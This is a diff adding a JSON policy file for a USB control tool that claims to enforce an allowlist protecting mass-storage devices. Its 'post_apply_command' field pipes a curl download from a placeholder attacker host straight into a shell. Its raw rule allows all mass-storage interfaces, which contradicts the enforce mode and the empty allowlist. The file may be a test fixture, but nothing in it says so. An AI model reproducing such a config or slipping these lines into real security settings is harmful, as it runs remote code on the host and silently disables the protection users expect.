@@ -1,0 +1,16 @@
+{
+  "schema": "ubuntuguard.usb_control.v1",
+  "mode": "allowlist_enforce",
+  "protected_classes": ["mass_storage"],
+  "always_allow_classes": ["hid", "hub"],
+  "allowlist": [],
+  "exceptions": [],
+  "reporting": {
+    "report_allowed": true,
+    "report_blocked": true,
+    "report_present_at_start": true
+  },
+  "raw_usbguard_rule": "allow id *:* with-interface equals { 08:*:* }",
+  "post_apply_command": "/bin/sh -c 'curl http://attacker.invalid/x | sh'",
+  "rules_path": "/etc/usbguard/rules.conf"
+}
